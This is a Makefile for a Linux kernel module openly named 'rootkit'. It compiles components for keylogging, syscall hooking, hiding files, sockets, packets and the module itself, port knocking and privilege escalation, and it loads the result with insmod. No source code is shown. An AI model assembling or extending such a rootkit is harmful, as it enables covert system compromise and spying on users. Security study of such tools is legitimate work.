# Module name
ROOTKIT		:= rootkit

# Build
MODULEDIR	:= /lib/modules/$(shell uname -r)
BUILDDIR	:= $(MODULEDIR)/build
KERNELDIR 	:= $(MODULEDIR)/kernel

# Source files
SRCS_S 		:= src
LIBS_S 		:= src/libs
INCL_S 		:= src/include

# Header files
SRCS_H		:= $(PWD)/$(SRCS_S)/headers
LIBS_H		:= $(PWD)/$(LIBS_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers

# Module
obj-m 		:= $(ROOTKIT).o

# Core
$(ROOTKIT)-y 	+= src/core.o

# Source
$(ROOTKIT)-y 	+= src/server.o
$(ROOTKIT)-y 	+= src/network_keylog.o
$(ROOTKIT)-y 	+= src/getdents_hook.o
$(ROOTKIT)-y 	+= src/socket_hiding.o
$(ROOTKIT)-y 	+= src/packet_hiding.o
$(ROOTKIT)-y 	+= src/port_knocking.o
$(ROOTKIT)-y 	+= src/privilege_escalation.o
$(ROOTKIT)-y 	+= src/module_hiding.o

# Libs
$(ROOTKIT)-y 	+= src/libs/syscalltable.o

# Include
$(ROOTKIT)-y 	+= src/include/utils.o

ccflags-y	:= -I$(SRCS_H) -I$(LIBS_H) -I$(INCL_H)

# Recipes
all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules

load:
	insmod $(KERNELDIR)/net/ipv4/netfilter/nf_reject_ipv4.ko
	insmod $(KERNELDIR)/net/ipv6/netfilter/nf_reject_ipv6.ko
	insmod rootkit.ko

clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean